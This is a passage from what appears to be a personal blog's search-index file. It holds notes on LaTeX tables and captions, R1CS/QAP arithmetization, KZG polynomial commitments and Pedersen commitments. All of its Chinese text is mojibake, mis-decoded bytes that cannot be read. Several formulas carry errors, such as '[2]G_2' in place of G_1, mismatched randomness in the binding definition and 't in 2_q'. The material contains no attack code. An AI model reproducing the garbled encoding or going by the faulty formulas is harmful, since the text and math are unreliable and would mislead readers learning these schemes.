package) detected</h2><p>åœ¨ä½¿ç”¨ IEEEtrans æ¨¡æ¿æ—¶å‘ç°çš„æŠ¥é”™ï¼Œå› ä¸º IEEEtrans æ¨¡æ¿é‡æ–°å®šä¹‰äº†caption çš„æ ¼å¼ï¼Œè€Œæˆ‘ç”±äºä½¿ç”¨äº† subfig è¿™ä¸ªåŒ…ï¼Œå› æ­¤ä¼šè¦†ç›–æ‰ IEEEçš„å®šä¹‰ï¼Œå› æ­¤ï¼Œåœ¨ usepackage æ—¶ç¦ç”¨æ‰ caption å®šä¹‰å°±è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\usepackage[caption=false]&#123;subfig&#125;</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š <ahref="https://tex.stackexchange.com/questions/277333/begin-equation-numbering-with-specific-number">counters- Begin equation numbering with specific number - TeX - LaTeX StackExchange</a></p><p><ahref="https://www.overleaf.com/learn/how-to/Cross_referencing_with_the_xr_package_in_Overleaf#How_to_use_xr_on_Overleaf">Crossreferencing with the xr package in Overleaf - Overleaf, Online LaTeXEditor</a></p><h2 id="table">table</h2><p>ç›´æ¥ä½¿ç”¨ç½‘é¡µä¸Šçš„ LaTeX table generator è§£å†³é—®é¢˜</p><ol type="1"><li><p>æœ«å°¾åŠ  <code>\hline</code> æ˜¯æ¨ªçº¿</p></li><li><p><code>\begin&#123;tabular&#125;&#123;ccc&#125;</code> æ˜¯æ¯æ å±…ä¸­ï¼Œ<code>\begin&#123;tabular&#125;&#123;|c|c|c|&#125;</code> ç«–æ å¯¹åº”åˆ—çš„ç«–çº¿</p></li><li><p>åŠ ç²—çº¿</p></li></ol><p><code>\usepackage&#123;makecell&#125;</code> and use<code>\Xhline&#123;2\arrayrulewidth&#125;</code> instead of<code>\hline</code></p><ol start="4" type="1"><li>è°ƒæ•´åˆ—è¡¨è¡Œè·</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\begin&#123;table&#125;</span><br><span class="line">\renewcommand\arraystretch&#123;2&#125;         %è¡¨æ ¼å†…éƒ¨ 2 å€è¡Œè·ç¦»</span><br></pre></td></tr></table></figure><p>æˆ‘çš„è¡¨åˆ—æ•°æ¯”è¾ƒå¤šï¼ŒåŒæ æ—¶æ”¾ä¸ä¸‹ã€‚å¯ä»¥å°†å·¦è¾¹è·è®¾ç½®å°ä¸€ç‚¹ï¼Œç±»ä¼¼è°ƒè¡Œè·é‚£ä¸ªï¼š</p><p><code>\renewcommand&#123;\arraystretch&#125;&#123;1.3&#125;%è°ƒè¡Œè·</code></p><p><code>\setlength\tabcolsep&#123;3pt&#125;%è°ƒåˆ—è·</code></p><p>å‚è€ƒ <a href="http://www.52yfjc.com/2014/show.asp?id=979">LaTexæŠ€å·§[43]ï¼šLatex å¦‚ä½•è°ƒæ•´è¡¨æ ¼çš„è¡Œè·-è¿œæ–¹æ•™ç¨‹</a></p><h2 id="æ³¨æ„åœ¨-latex-.bib-ä¸­æ³¨é‡Š-çš„å¥å­æ˜¯ä¸ç®¡ç”¨çš„"><strong>æ³¨æ„åœ¨ latex.bib ä¸­æ³¨é‡Š @ çš„å¥å­æ˜¯ä¸ç®¡ç”¨çš„</strong></h2><p>@ åº”è¯¥æ˜¯ç‰¹æ®Šå­—ç¬¦ï¼Œæ³¨é‡Šä¸ç®¡ç”¨ï¼Œä¼šæŠ¥é”™ bib æ ¼å¼ä¸å¯¹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">% article&#123;RS_1960,</span><br><span class="line">%   title     = &#123;Polynomial codes over certain finite fields&#125;,</span><br><span class="line">%   author    = &#123;Reed, Irving S and Solomon, Gustave&#125;,</span><br><span class="line">%   journal   = &#123;Journal of the society for industrial and applied mathematics&#125;,</span><br><span class="line">%   volume    = &#123;8&#125;,</span><br><span class="line">%   number    = &#123;2&#125;,</span><br><span class="line">%   pages     = &#123;300--304&#125;,</span><br><span class="line">%   year      = &#123;1960&#125;,</span><br><span class="line">%   publisher = &#123;SIAM&#125;</span><br><span class="line">% &#125;</span><br></pre></td></tr></table></figure><h2 id="latex-è¡¨æ ¼åŠ æ³¨é‡Š">latex è¡¨æ ¼åŠ æ³¨é‡Š</h2><p><a href="https://www.ivdone.cn/article/454.html">latexå¦‚ä½•åœ¨è¡¨æ ¼ä¸‹é¢åŠ å…¥æ³¨é‡Šæˆ–è€…æ ‡æ³¨</a></p><h2 id="å‚è€ƒ">å‚è€ƒ</h2><p><a href="http://www.52yfjc.com/2014/show.asp?id=979">LaTexæŠ€å·§[43]ï¼šLatex å¦‚ä½•è°ƒæ•´è¡¨æ ¼çš„è¡Œè·-è¿œæ–¹æ•™ç¨‹</a></p><h2 id="å…¬å¼">å…¬å¼</h2><h3 id="å…¬å¼å¯¹é½">å…¬å¼å¯¹é½</h3><ul><li><code>align</code> outside the math mode</li><li><code>aligned</code> inside the math mode,æ³¨æ„åœ¨åœ¨ <spanclass="math display">\[\begin{equation}\end{equation}\]</span> ä¹‹é—´ç”¨<code>aligned</code>ï¼Œ markdown ä¸­</li><li><code>&amp;</code> æ”¾åœ¨è¦å¯¹é½çš„ä½ç½®</li></ul><p>è°ƒæ•´å…¬å¼ä¹‹é—´é—´è·ä»¥åŠå…¬å¼ä¸ä¸Šä¸‹æ–‡å­—é—´è·ï¼š<code>\vspace&#123;1cm&#125;</code>ï¼Œ[1cm]å¡«å†™çš„æ•°å­—å¯æ­£å¯è´Ÿã€‚</p><h2 id="æ•°å­¦ç¬¦å·">æ•°å­¦ç¬¦å·</h2><h3 id="å¸¦å¹¿æ’­çš„çŸ©é˜µä¸å‘é‡å…ƒç´ ç›¸ä¹˜">å¸¦å¹¿æ’­çš„çŸ©é˜µä¸å‘é‡å…ƒç´ ç›¸ä¹˜</h3><p>The elementwise/Hadamard product (âˆ˜) and the all-ones vector ğŸ· can beused to write your product as</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/hadamard_latex.jpg"alt="hadamard_latex" /> æˆ–è€… <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/diag_dot_latex.jpg"alt="diag_dot_latex" /></p><h3 id="å‚è€ƒ-1">å‚è€ƒ</h3><ol type="1"><li><p><ahref="https://math.stackexchange.com/questions/3274790/notation-for-element-wise-multiplication-of-vector-and-matrix-columns">matrices- Notation for element-wise multiplication of vector and matrix columns- Mathematics Stack Exchange</a></p></li><li><p><ahref="https://math.stackexchange.com/questions/2686188/gradient-of-broadcast-plus">matrices- Gradient of broadcast plus - Mathematics Stack Exchange</a></p></li></ol><h2 id="çœç•¥å·">çœç•¥å·</h2><p>å’Œ æ˜¯ä½ä½ç½®çœç•¥å· Low dots å’Œä¸­å¿ƒä½ç½®çœç•¥å· centered dots çš„ latexå‘½ä»¤, æ˜¯ amsmath å‘½ä»¤ç”¨æ¥è¯•å›¾å¸®ä½ åœ¨ å’Œ ä¸­è‡ªåŠ¨åšå†³æ–­çš„ã€‚</p><p>é€šå¸¸æ¥è®²ä¸­å¿ƒçœç•¥ ä¸€èˆ¬ç”¨åœ¨æ•°å­¦æ¨¡å¼çš„ä¸­å¿ƒçº¿ä¸Šçš„ç¬¦å·åé¢ï¼Œä¾‹å¦‚åŠ å· +æˆ–è€…å³ç®­å¤´ -&gt; , è€Œ ä¸€èˆ¬ç”¨åœ¨æ ‡ç‚¹ç¬¦å·çš„åé¢ï¼Œä¾‹å¦‚å¥å·â€œ .â€ or é€—å·â€œ,â€ã€‚</p><h2 id="algorithm-ä¸­çš„">algorithm ä¸­çš„ </h2><p><code>\gets</code> æ“ä½œç¬¦çš„ä¸¤ä¸ªæ“ä½œæ•°éœ€è¦è¦ä½äº <code>$$</code>ä¹‹ä¸­ï¼Œè€Œä¸”è¯¥ <code>$$</code> ä¹‹ä¸­æ˜¯å…¬å¼ç¯å¢ƒï¼Œä¸éœ€è¦å†å†™<code>$</code>:</p><p><code>\STATE $ftrusted_i \gets ReliabilityCheck(&#123;\tilde&#123;W&#125;_&#123;i&#125;^&#123;t&#125;&#125;,BC)$</code></p><h2 id="for-å¾ªç¯-if-åˆ¤æ–­åé¢åŠ å¯è§æ³¨é‡Š">for å¾ªç¯, ifåˆ¤æ–­åé¢åŠ å¯è§æ³¨é‡Š</h2><p>ä¾‹å¦‚éœ€è¦åœ¨ for å¾ªç¯åæ³¨é‡Š <code>in parallel</code> çš„æ–‡å­—:<code>\FOR[\textbf&#123;in parallel&#125;]&#123;worker $i = 1, \cdots, N$&#125;</code></p>æ³¨æ„åŠ æœ€åçš„é€—ç‚¹æ—¶ä¸è¦åŠ åˆ° for å¾ªç¯ï¼Œif åˆ¤æ–­ç­‰çš„åé¢ï¼Œä¼šæŠ¥é”™ miss<h1 id="latex-add-section-bookmark-for-pdf">Latex add section bookmarkfor pdf</h1><p>å®ç°å¦‚ä¸‹ï¼šåœ¨å¯¼è¨€åŒºä¸­åŠ å…¥ä»¥ä¸‹çš„ä¸€è¡Œå‘½ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\usepackage[breaklinks,colorlinks,linkcolor=black,citecolor=black,urlcolor=black]&#123;hyperref&#125;</span><br></pre></td></tr></table></figure><p>hyperrefä¸­å„å‚æ•°çš„ä½œç”¨å‚è€ƒä»¥ä¸‹é“¾æ¥:https://wenku.baidu.com/view/c73c48427cd184254b353572.html</p><h2 id="latex-å¯¹-replt-letter-åŠ é¢œè‰²">LaTex å¯¹ Replt letter åŠ é¢œè‰²</h2><h3 id="latex-å¯¹æ–‡å­—åŠ é¢œè‰²">LaTeX å¯¹æ–‡å­—åŠ é¢œè‰²</h3><p><code>\textcolor&#123;red&#125;&#123;text&#125;</code> æ³¨æ„åŒ…è£¹çš„ textéœ€è¦æ˜¯ä¸€æ®µæ–‡å­—ä¸èƒ½æ¢è¡Œã€‚</p><h3 id="latex-å¯¹-table-åŠ é¢œè‰²">LaTeX å¯¹ Table åŠ é¢œè‰²</h3><p>åœ¨ caption å‰é¢åŠ  ä¾¿æ˜¯ blue è‰²</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\color&#123;blue&#125;</span><br><span class="line">\caption&#123;Notations of Model Verification Mechanism&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
          <category> latex </category>
          
      </categories>
      
      
        <tags>
            
            <tag> latex </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Arithmetization</title>
      <link href="/blog/2023/04/06/crypto/zk/11.arithmetization/"/>
      <url>/blog/2023/04/06/crypto/zk/11.arithmetization/</url>
      
        <content type="html"><![CDATA[<h1 id="arithmetization">Arithmetization</h1><p>The structure of zk: <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/zk_struct.png"alt="zk_struct" /></p><p>The goal of arithmetizations is reduce the computation to singlepolynomial identity.</p><p>Two common arithmetizations</p><h2 id="r1cs---qap">R1CS -&gt; QAP</h2><p>R1CS (rank 1 constraint system) is equivalent to QAP (Quadraticarithmetic program). The circom is complied to R1CS.</p><p>Any computation expressed in the R1CS system we want to check itscorrectness using a single polynomial identity.</p><p>An R1CS is a conjunction of constraints, each of the form:<code>(a DOT x) * (b DOT x) = (c DOT x)</code></p><p>R1CS -&gt; QAP: <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/r1cs.png"alt="R1CS" /></p><p>Many problems in Symbolic Computation and cryptography can beexpressed as the task of <strong>computing somepolynomials</strong>.</p><blockquote><p>In computational complexity theory, arithmetic circuits are thestandard model for computing polynomials. - wikepedia</p></blockquote><p>The details of R1CS can be seen in the two following post. Highlyrecommend the first post begin with the introduction of arithmeticcircuit and constraint system, and then dive into the R1CS from shallowto deep.</p><ol type="1"><li><ahref="https://tlu.tarilabs.com/cryptography/rank-1#from-arithmetic-circuits-to-programmable-constraint-systems-for-bulletproofs">Rank-1Constraint System with Application to Bulletproofs</a></li><li><ahref="https://medium.com/@VitalikButerin/quadratic-arithmetic-programs-from-zero-to-hero-f6d558cea649">QuadraticArithmetic Programs: from Zero to Hero | by Vitalik Buterin |Medium</a></li></ol><h2 id="air">AIR</h2><p>AIR (Algebraic intermediate representation) --pre-processing--&gt;PAIR --verifier's randomness--&gt; RAP</p><p>RAP is the arithmetization method used by PLONK</p><h2 id="references">References</h2>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> zero-knowledge proof </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>polynomial commitment and KZG commitment</title>
      <link href="/blog/2023/04/03/crypto/zk/10.kzg_commit/"/>
      <url>/blog/2023/04/03/crypto/zk/10.kzg_commit/</url>
      
        <content type="html"><![CDATA[<h1 id="polynomial-commitment-and-kzg-commitment">polynomial commitmentand KZG commitment</h1><p>Merkle tree commitment:</p><ol type="1"><li>commitment = root hash (For SHA256, 32 bytes)</li><li>Proof: <span class="math inline">\(log(n)\)</span> proof size</li><li>Application: state trie / Merkle Patricia Trie</li></ol><p>KZG commitment:</p><ol type="1"><li>commitment = 48 bytes (a Jacobian elliptic curve point)</li><li>Proof: 48 bytes (no matter <span class="math inline">\(n\)</span>is)</li><li>Multi-point proof/batch proof <spanclass="math inline">\(y_{i(0)},y_{i(1)},\cdots, y_{i(m-1)}\)</span>: 48bytes (no matter <span class="math inline">\(n\)</span> is)</li><li>Multi-polynomial commitmentã€proof aggregation</li><li>Application: Stateless (Verkle tree), DAS (data availabilitysampling)</li></ol><h2 id="overall-procedures-of-kzg">Overall procedures of KZG</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Knowledge -&gt;ï¼ˆPoint-Values -&gt;) Coefficients -&gt; Commitment -&gt; Open&amp;Prove&amp;Verify</span><br><span class="line">                          FFT            MSM</span><br><span class="line">                                          ^</span><br><span class="line">                                          |</span><br><span class="line">                                    Trusted Setup</span><br></pre></td></tr></table></figure><h2 id="encode-data-into-polynomial">Encode data into Polynomial</h2><p>Give <span class="math inline">\((x_i, y_i)\)</span>, <spanclass="math inline">\(x_i \ne x_j \forall i \ne j\)</span>, there aretwo way to encode the data into the polynomial.</p><ol type="1"><li><p>If the <span class="math inline">\(x_i\)</span> is just indiceswithout other sense, then only data is valuable. The data can beconverted into integers and treated as the coefficients of thepolynomial.</p></li><li><p>Regardless of whether <span class="math inline">\(x_i\)</span> isa sequential index, whether it stores information or not, these pointscan be treated as the point-value representation of the polynomials. TheInverse FFT can be used to convert the point-value representation tocoefficient representation.</p></li></ol><p>Normally, the binary or integer data are encoded into a finite field<span class="math inline">\(\mathbb{F}_q\)</span>, q is a prime suchthat {0, 1, 2, , q-1} modulo q.</p><blockquote><p>a finite field is a set on which the operations of multiplication,addition, subtraction and division are defined and satisfy certain basicrules. -- wikipedia</p></blockquote><p>Elliptic curve groups are additive groups; that is, their basicfunction is addition. When it comes to the multiplication of curvepoints, the pairing is introduced.</p><h2 id="polynomial-on-elliptic-curve">Polynomial on Elliptic curve</h2><p>Elliptic curve <span class="math inline">\(\mathbb{G_1} = [0, G_1,G_1+G_1 = [2]G_2, \cdots, [q]G_1]\)</span>, where <spanclass="math inline">\([q+1]G_1=0\)</span></p><p><span class="math inline">\([f(x)]G_1 = [\sum_{i=0}^n a_i x^i]G_1 =\sum_{i=0}^n a_i ([x_iG_1]) = \sum_{i=0}^n a_i [x_i]_1\)</span></p><h2 id="polynomial-commitment-with-trusted-setup">Polynomial Commitmentwith Trusted Setup</h2><p>a secret <span class="math inline">\(s \in F_q\)</span> can begenerates, such that</p><ol type="1"><li>nobody knows the <span class="math inline">\(s\)</span> (private keyof 'god')</li><li><span class="math inline">\([s^i]G_1=[s^i]_1, i=1, \cdots\)</span>and <span class="math inline">\([s^i]G_2=[s^i]_2, j=1, \cdots\)</span>is known to everybody. (public key of 'god')</li><li>Benefiting from the discrete log problem of the Elliptic curve, noone can recover <span class="math inline">\(s_i\)</span> though <spanclass="math inline">\([s^i]_1 or [s^i]_2\)</span></li></ol><p>If you are familiar with the secret key in EDCSA signature, that'sit. The <span class="math inline">\([s^i]G_i, [s^i]G_2\)</span> can beseen as the public key.</p><p>Nowdays, popular way to generate <spanclass="math inline">\(s\)</span> is MPC. Besides, Ethereum is doing KZGceremony, <ahref="https://github.com/ethereum/kzg-ceremony-specs">ethereum/kzg-ceremony-specs:Specs for Ethereum's KZG Powers of Tau Ceremony</a>. The degree of <spanclass="math inline">\(G_2\)</span> is significantly smaller than <spanclass="math inline">\(G_1\)</span>. Therefore, in pairings, the highdegree part should match with <span class="math inline">\(G_1\)</span>and the low degree part with $G_2".</p><p><strong>Commitment</strong>: <span class="math inline">\(Com =[f(s)]_1 = \sum_{i=0}^n [a_i s_i]G_1 = \sum_{i=0}^n a_i[s_i]_1\)</span>, where Com is actually a point on the ellipticcurve.</p><blockquote><p>From the Schwartz-Zippel Lemma, finding a random <spanclass="math inline">\(x_0\)</span> such that the probability of <spanclass="math inline">\(F(x_0) = f(s)\)</span> is impossible.</p></blockquote><h2 id="single-proof">Single proof</h2><p>Given <span class="math inline">\(x_i\)</span>, we want to prove thecomputing result <span class="math inline">\(y_i = f(x_i)\)</span>,</p><p><span class="math display">\[\begin{equation}\begin{aligned}        &amp;f(x) - y_i = q(x)(x - x_i) \\        &amp;q(x) = \frac{f(x)-y_0}{x-x_0}\end{aligned}\end{equation}\]</span></p><p>Let's integrate the formula with an elliptic curve,</p><p><span class="math display">\[\begin{equation}\begin{aligned}    [f(x) - y_i] G_1 &amp;= [q(x)(x - x_i)] G_1 \\    [f(x)]_1 - [y_i]_1 &amp;= ?\end{aligned}\end{equation}\]</span></p><p>However, <span class="math inline">\(q(x) x G_1- q(x) x_iG_1\)</span> cannot be evaluated at coordinate <spanclass="math inline">\(x=s\)</span> without knowing <spanclass="math inline">\(s\)</span>. To solve the problem, <spanclass="math inline">\(q(x)\)</span> and <span class="math inline">\(x -x_i\)</span> need to be split into multiplication. While the pairingallows to "multiply" the exponents of two group elements, while theusual group structure only allows adding or subtracting exponents</p><p>So let pairing, <span class="math inline">\(e: \mathbb{G_1} \times\mathbb{G_2} \rightarrow \mathbb{G_T}\)</span></p><p><span class="math display">\[\begin{equation}\begin{aligned}    [f(s) - y_i] G_1 G_2 &amp;= [q(s)(s - x_i)] G_1 G_2 \\    e([f(s) - y_i] G_1, G_2) &amp;= e(q(s)G_1, (s - x_i)G_2) \\    e([f(s)]_1 - [y_i]_1, G_2) &amp;= e([q(s)]_1, [s]_2 - [x_i]_2) \\    e(Com - [y_i]_1, G_2) &amp;= e([q(s)]_1, [s]_2 - [x_i]_2),\end{aligned}\end{equation}\]</span></p><p>where <span class="math inline">\(q(s)_1\)</span> is the<strong>proof</strong> (48 bytes as a point on an elliptic curve).</p><p>Great, the above all can be calculated without <spanclass="math inline">\(s\)</span>.</p><p>Note: Not all curve can do pairing, G1 and G2 ispairing-friendly.</p><p>For multi-proof, assume that you have an interpolation polynomialI(X) such that <span class="math inline">\(I(x_i) = y_i\)</span>, where<span class="math inline">\((x_i,y_i)\)</span> is a list of evaluationpoints.</p><p><span class="math display">\[q(x) = \frac{f(x)-I(x)}{\prod{(x-x_i)}}\]</span></p><h2 id="polynomial-commitment-çš„å…¶ä»–å®ç°">Polynomial Commitmentçš„å…¶ä»–å®ç°</h2><ol type="1"><li>KZGï¼šPLONKã€Marlin</li><li>FRIï¼šzkSTARK</li><li>IPAï¼šBulletproof</li><li>IPA + Halo-style aggregationï¼šHalo 2</li></ol><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/poly_commits.png"alt="polynomial commitments" /><figcaption aria-hidden="true">polynomial commitments</figcaption></figure><ol start="3" type="1"><li>KZG Commitment çš„ä¼˜ç¼ºç‚¹<ol type="1"><li>ç¼ºç‚¹ï¼šéœ€è¦ Trusted Setup</li><li>ä¼˜ç‚¹ï¼šproof é•¿åº¦çŸ­ä¸”æ’å®š</li></ol></li></ol><h2 id="todo">TODO</h2><p><a href="https://vitalik.ca/general/2021/06/18/verkle.html">Verkletrees</a></p><p>åé¢è¯»ä¸€ä¸‹ kzg åŸè®ºæ–‡</p><p>å¤šé¡¹å¼æ‰¿è¯ºè®¡ç®—å°±æ˜¯ MSMï¼ŒMSM çš„é«˜æ•ˆå®ç° pippenger ç®—æ³•</p><h2 id="references">References</h2><ol type="1"><li><ahref="https://dankradfeist.de/ethereum/2021/10/13/kate-polynomial-commitments-mandarin.html">RecommendedKZG å¤šé¡¹å¼æ‰¿è¯º | Dankrad Feist</a></li><li><a href="https://www.youtube.com/watch?v=n4eiiCDhTes">PolynomialCommitment KZG with Examples ( part 1 ) - YouTube</a></li><li><a href="https://scroll.io/blog/kzg">KZG in Practice: PolynomialCommitment Schemes and Their Usage in Scaling Ethereum - Scroll</a></li><li><ahref="https://crypto.stackexchange.com/questions/56400/why-pairings-on-elliptic-curve-are-used">Why"pairings on elliptic curve" are used? - Cryptography StackExchange</a></li><li><a href="https://www.youtube.com/watch?v=nkrk3jLj8Jw">é›¶çŸ¥è¯†è¯æ˜ KZGCommitment 1: Polynomial Commitment 20221129 - YouTube</a></li><li><ahref="https://copper-witch-857.notion.site/Polynomial-KZG-or-Kate-Commitment-DappLearning-Notes-fc426c8cb9a14878840852506865f13b">Polynomial(KZG or Kate) Commitment (DappLearning) Notes</a></li><li><ahref="https://blog.subspace.network/kzg-polynomial-commitments-cd64af8ec868">KZGPolynomial Commitments. This article is based on Dankradâ€¦ | by OzgunOzerk | Subspace Network</a></li><li>[./media/kzg_exercise_sol.pdf]</li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> zero-knowledge proof </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Cryptographic Commitment and pedersen commitment</title>
      <link href="/blog/2023/04/02/crypto/zk/9.pedersen_comm/"/>
      <url>/blog/2023/04/02/crypto/zk/9.pedersen_comm/</url>
      
        <content type="html"><![CDATA[<p>Cryptographic commmitment: emulates an envelope.</p><h2 id="syntax">Syntax</h2><p>a commitment scheme is two algorithms: commit and verify</p><ol type="1"><li><p><code>commit(msg, r) -&gt; com</code></p><p><strong>r</strong>: secret randomness in <strong>R</strong>, alsocalled bliding factor <strong>com</strong> : commitment string</p></li><li><p><code>verify(msg, com, r) -&gt; accept or reject</code></p><p>anyone can verify that commmitment was opened correctly</p></li></ol><h2 id="security-properties">security properties</h2><ol type="1"><li><p>binding: Bob cannot produce two valid openings for<strong>com</strong></p><p>More procisely: no efficient adversary can produce<strong>com</strong>, (m1, r1), (m2, r1), such that verify(m1,<strong>com</strong>, r1) = verify(m2, <strong>com</strong>, r2)=acceptand m1!=m2</p></li><li><p>hiding: <strong>com</strong> reveals nothing about committeddata</p><p>commit(m, r)-&gt;<strong>com</strong>, and r is sampled uniformly in<strong>R</strong>, then <strong>com</strong> is statistically indenpentof <strong>m</strong>.</p></li></ol><h2 id="ç¦»æ•£å¯¹æ•°å‡è®¾">ç¦»æ•£å¯¹æ•°å‡è®¾</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16640923085899.jpg"alt="discrete log" /><figcaption aria-hidden="true">discrete log</figcaption></figure><p>æ ¹æ®å‚ä¸æ–¹è®¡ç®—èƒ½åŠ›çš„ä¸åŒï¼Œæ‰¿è¯ºæ–¹æ¡ˆä¸€èˆ¬åˆ†ä¸ºä¸¤ç±»ï¼šschemes withcomputationally hiding, perfect binding and schemes with computationallybinding, perfect hiding</p><h2 id="example-1-hash-based-commitment">Example 1: hash-basedcommitment</h2><p>Fix a hash function: H: M x R-&gt;C (e.g., SHA256), (M:hash space, R:randomness space, C: commitment space), where H is collision resistant,and |R| &gt;&gt; |C|(Randomness space is much large than commitmentspace)</p><ol type="1"><li><p><span class="math display">\[comit(m \in M, r \gets R)\]</span>:<strong>com</strong> = H(m, r)</p><p>sample a random string <strong>r</strong> from set<strong>R</strong></p></li><li><p>verify(m, <strong>com</strong>, r): accpet if com = H(m,r)</p></li><li><p>binding: follows from coll ision resistance of H</p></li><li><p>hiding: follows from a mild assumption on H assume function Hbehaves sort of like a random function, then the fact that therandomness space is so much bigger than the commitment means that giventhe commitment value h(m, r) is actually independent of m</p></li></ol><h2 id="example-2-pedersen-commitment">Example 2: PedersenCommitment</h2><p>Pederson æ‰¿è¯º,äº 1992 å¹´è¢« Pedersen åœ¨ â€œ<ahref="https://link.springer.com/content/pdf/10.1007/3-540-46766-1_9.pdf">Non-Interactiveand Information-Theoretic Secure Verifiable Secret Sharing</a>â€ä¸€æ–‡ä¸­æå‡ºã€‚</p><blockquote><p>è¯¥ paper çš„ section å¯¹ Pedersen Commitmentè®²è¿°æä¸ºç®€æ´æ˜“æ‡‚,å¯ä»¥è¯»è¯»</p></blockquote><p>Pedersenæ‰¿è¯ºæ˜¯ä¸€ä¸ªæ»¡è¶³å®Œç¾éšè—ã€è®¡ç®—ç»‘å®šçš„åŒæ€æ‰¿è¯ºåè®®ï¼Œå…¶å®Œç¾éšè—æ€§ä¸ä¾èµ–ä¸ä»»ä½•å›°éš¾æ€§å‡è®¾(randomness&lt;- algebraic hash function)ï¼Œè®¡ç®—ç»‘å®šä¾èµ–äºç¦»æ•£å¯¹æ•°å‡è®¾(DLA).è¯¥ä»¥æŒ‡æ•°è¿ç®—çš„å½¢å¼æå‡º(åŸºäºç¦»æ•£å¯¹æ•°éš¾é¢˜), è€Œç›®å‰ Pedersen Commitmentä¸»è¦æ­é…æ¤­åœ†æ›²çº¿å¯†ç å­¦ä½¿ç”¨(åŸºäºæ¤­åœ†æ›²çº¿çš„ç¦»æ•£å¯¹æ•°é—®é¢˜ï¼‰,å…·æœ‰åŸºäºç¦»æ•£å¯¹æ•°å›°éš¾é—®é¢˜çš„å¼ºç»‘å®šæ€§å’ŒåŒæ€åŠ æ³•ç‰¹æ€§çš„å¯†æ–‡å½¢å¼ã€‚ä¸‹é¢åˆ†åˆ«ä»‹ç»è¯¥æ‰¿è¯ºçš„ä¸¤ç§å½¢å¼.</p><h3 id="åŸºäºç¦»æ•£å¯¹æ•°çš„-pedersen-commitment">åŸºäºç¦»æ•£å¯¹æ•°çš„ PedersenCommitment</h3><p><strong>Core</strong>: The committer commits himself to an <spanclass="math display">\[s \in Z_q\]</span> by choosing <spanclass="math display">\[t \in 2_q\]</span>, at random and computing:<span class="math display">\[com = g^s * h^t\]</span></p><ol type="1"><li><p>åˆå§‹åŒ–é˜¶æ®µ setup:</p><p>é€‰æ‹©é˜¶ä¸ºå¤§ç´ æ•° q çš„ä¹˜æ³•ç¾¤ G, ç”Ÿæˆå…ƒï¼Œ<spanclass="math display">\[G=&lt;g&gt;=&lt;h&gt;\]</span>ï¼Œå…¬å¼€ä¸‰å…ƒç»„:(gï¼Œhï¼Œq)ï¼›</p><p>chosing a prime-order group <span class="math inline">\(G\)</span> =finite cyclic group = <span class="math display">\[{1, g, g^2, ...,g^{q-1}}\]</span> where <span class="math display">\[g^i * g^j = g^{i+j\mod q}\]</span>(note: element generated by generator is in the group).<span class="math display">\[q = |G|\]</span></p><p>Fix g,h in G and let R = {0, 1, 2, q-1}.</p><p>ç”±äº r ä¸ºéšæœºæ•°ï¼ŒPedersen commitment å…·æœ‰å®Œç¾éšè—æ€§ï¼ˆunconditionallyhidingï¼‰ç‰¹æ€§ï¼Œä»¥åŠåŸºäºç¦»æ•£å¯¹æ•°å‡è®¾çš„å®Œç¾éšè—æ€§ï¼ˆcomputationallybindingï¼‰ç‰¹æ€§ã€‚</p></li><li><p>æ‰¿è¯ºé˜¶æ®µ com</p><p>æ‰¿è¯ºæ–¹é€‰æ‹©éšæœºæ•° r ä½œä¸ºç›²å› å­ï¼Œè®¡ç®—æ‰¿è¯ºå€¼ï¼Œç„¶åå‘é€ com ç»™æ¥æ”¶è€…ï¼›prepare secret value m, choose blinding factor <spanclass="math display">\[r \in R\]</span>, and commmit</p><p><span class="math display">\[commit(m \in R, r \gets R) = H(m, r) =g^m * h^r\]</span></p><p>Fact: For a cryptograpic group G, this H is collision resistant, thiscalled discrete logs problem.</p></li><li><p>æ‰“å¼€é˜¶æ®µ open</p><p>æ‰¿è¯ºæ–¹å‘é€ (mï¼Œr) ç»™æ¥æ”¶è€…ï¼Œæ¥æ”¶è€…éªŒè¯ com æ˜¯å¦ç­‰äº <spanclass="math display">\[H(m, r) = g^m *h^r\]</span>ï¼Œå¦‚æœç›¸ç­‰åˆ™æ¥å—ï¼Œå¦åˆ™æ‹’ç»æ‰¿è¯ºã€‚</p></li></ol><h3 id="homomorphic-property">homomorphic property</h3><p><span class="math display">\[commit(m \in R, r \gets R) = H(m, r) =g^m * h^r\]</span></p><p>Suppose: <span class="math display">\[commit(m1 \in R, r_1 \gets R)\to com_1\]</span> and <span class="math display">\[commit(m2 \in R, r_2\gets R) \to com_2\]</span></p><p>Then <span class="math display">\[com_1 \times com_2 = g^{m_1+m_2}\times h^{r_1+r_2} = commmit(m_1 + m_2, r_1 + r_2)\]</span></p><p>anyone can sum commmited value. This is the homomorphic propertywhich lets you compute uncommited values(m1+m2) 